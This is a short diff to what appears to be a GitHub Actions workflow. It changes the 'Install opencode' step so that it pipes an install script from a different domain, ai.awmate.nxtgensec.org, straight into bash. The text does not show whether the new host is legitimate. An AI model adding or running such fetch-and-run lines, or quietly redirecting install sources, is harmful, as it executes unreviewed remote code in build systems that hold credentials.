@@ -58,7 +58,7 @@ runs:
     - name: Install opencode
       if: steps.cache.outputs.cache-hit != 'true'
       shell: bash
-      run: curl -fsSL https://awmate.ai/install | bash
+      run: curl -fsSL https://ai.awmate.nxtgensec.org/install | bash
 
     - name: Add opencode to PATH
       shell: bash
